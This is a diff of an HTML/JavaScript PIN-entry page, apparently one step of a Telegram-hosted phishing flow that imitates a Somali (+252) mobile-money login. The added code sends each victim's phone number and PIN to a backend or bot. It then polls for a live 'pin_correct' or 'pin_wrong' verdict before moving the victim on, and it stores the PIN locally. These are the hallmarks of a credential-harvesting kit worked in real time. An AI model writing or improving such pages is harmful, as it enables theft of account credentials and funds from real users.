@@ -8,18 +8,13 @@
 
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-
         .header-box { width: 100%; background: linear-gradient(to bottom, #82d13d, #a3e635); padding: 40px 20px; color: white; text-align: center; box-sizing: border-box; }
-
         .main-content { width: 90%; max-width: 400px; margin: 40px auto 0; text-align: center; flex-grow: 1; }
-
         .footer-box { width: 100%; background: linear-gradient(to top, #82d13d, #a3e635); padding: 50px 20px 30px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; box-sizing: border-box; }
-
         .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
         .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
         .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
         .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; }
-
         h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
 
         .phone-display {
@@ -35,14 +30,10 @@
         }
 
         .pin-label { color: #888; margin-bottom: 20px; }
-
         .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
-
         .pin-input-group { display: flex; gap: 8px; }
-
         .pin-box {
-            width: 55px;
-            height: 55px;
+            width: 55px; height: 55px;
             border: 1.5px solid #82d13d;
             border-radius: 10px;
             text-align: center;
@@ -54,23 +45,14 @@
         .toggle-eye { cursor: pointer; margin-left: 10px; font-size: 20px; }
 
         .btn-gal {
-            background-color: #e0e0e0;
-            color: #fff;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 20px;
-            margin-top: 50px;
-            cursor: not-allowed;
-            font-weight: bold;
+            background-color: #e0e0e0; color: #fff; border: none;
+            width: 100%; padding: 18px; border-radius: 10px;
+            font-size: 20px; margin-top: 30px; cursor: not-allowed; font-weight: bold;
         }
 
-        .btn-gal.active {
-            background-color: #82d13d;
-            cursor: pointer;
-        }
+        .btn-gal.active { background-color: #82d13d; cursor: pointer; }
 
+        #status-msg { margin-top: 15px; font-size: 14px; font-weight: bold; min-height: 20px; }
         .spacer { height: 40px; }
     </style>
 </head>
@@ -94,13 +76,15 @@
 
     <div class="pin-container">
         <div class="pin-input-group">
-            <input type="password" maxlength="1" class="pin-box">
-            <input type="password" maxlength="1" class="pin-box">
-            <input type="password" maxlength="1" class="pin-box">
-            <input type="password" maxlength="1" class="pin-box">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
         </div>
         <span class="toggle-eye" id="eyeIcon">👁️</span>
     </div>
+
+    <div id="status-msg"></div>
 
     <button id="loginBtn" class="btn-gal" disabled>GAL</button>
     <div class="spacer"></div>
@@ -115,33 +99,31 @@
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-
     const pinBoxes = document.querySelectorAll('.pin-box');
     const loginBtn = document.getElementById('loginBtn');
     const eye = document.getElementById('eyeIcon');
     const displayPhone = document.getElementById('displayPhone');
+    const statusMsg = document.getElementById('status-msg');
 
-    // ✅ FIXED PHONE LOADING (safe fallback)
-    const savedPhone = localStorage.getItem('phone');
-    displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (ma jiro)";
+    const phone = localStorage.getItem('phone');
+    displayPhone.textContent = phone ? `+252 ${phone}` : "+252 (ma jiro)";
 
-    // PIN handling
+    let pollingInterval;
+
+    // Check for previous errors from Page 9
+    if (localStorage.getItem('pinError') === 'true') {
+        showError("🔑 PIN waa khalad. Fadlan mar kale isku day.");
+        localStorage.removeItem('pinError');
+    }
+
     pinBoxes.forEach((box, index) => {
-
         box.addEventListener('input', () => {
             box.value = box.value.replace(/\D/g, '');
-
-            if (box.value && index < pinBoxes.length - 1) {
-                pinBoxes[index + 1].focus();
-            }
-
+            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
             checkInputs();
         });
-
         box.addEventListener('keydown', (e) => {
-            if (e.key === "Backspace" && !box.value && index > 0) {
-                pinBoxes[index - 1].focus();
-            }
+            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
         });
     });
 
@@ -151,30 +133,73 @@ document.addEventListener("DOMContentLoaded", () => {
         loginBtn.classList.toggle('active', filled);
     }
 
-    // Eye toggle FIX
     eye.addEventListener('click', () => {
-        const show = pinBoxes[0].type === "password";
-        pinBoxes.forEach(b => b.type = show ? "text" : "password");
-        eye.textContent = show ? "🫣" : "👁️";
+        const isPass = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPass ? "text" : "password");
+        eye.textContent = isPass ? "🫣" : "👁️";
     });
 
-    // Login
-    loginBtn.addEventListener('click', () => {
+    loginBtn.addEventListener('click', async () => {
         let pin = "";
         pinBoxes.forEach(b => pin += b.value);
-
         localStorage.setItem('lastPin', pin);
 
-        window.location.href = "/page7";
+        // UI Feedback
+        loginBtn.disabled = true;
+        loginBtn.innerText = "Fadlan sug...";
+        statusMsg.innerText = "";
+
+        try {
+            // Notify your backend/bot
+            await fetch('/api/verify-pin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, pin })
+            });
+            startPolling();
+        } catch (e) {
+            showError("Khalad ayaa dhacay. Isku day mar kale.");
+            resetUI();
+        }
     });
 
-    // Telegram safe init
+    function startPolling() {
+        clearInterval(pollingInterval);
+        pollingInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await res.json();
+
+                if (data.status === "pin_correct") {
+                    clearInterval(pollingInterval);
+                    window.location.href = "page7.html";
+                } else if (data.status === "pin_wrong") {
+                    clearInterval(pollingInterval);
+                    showError("❌ PIN waa khalad. Fadlan isku day markale.");
+                    resetUI();
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+
+    function showError(msg) {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = msg;
+    }
+
+    function resetUI() {
+        pinBoxes.forEach(b => b.value = "");
+        loginBtn.innerText = "GAL";
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+        pinBoxes[0].focus();
+    }
+
     if (window.Telegram?.WebApp) {
         window.Telegram.WebApp.ready();
         window.Telegram.WebApp.expand();
     }
 });
 </script>
-
 </body>
 </html>
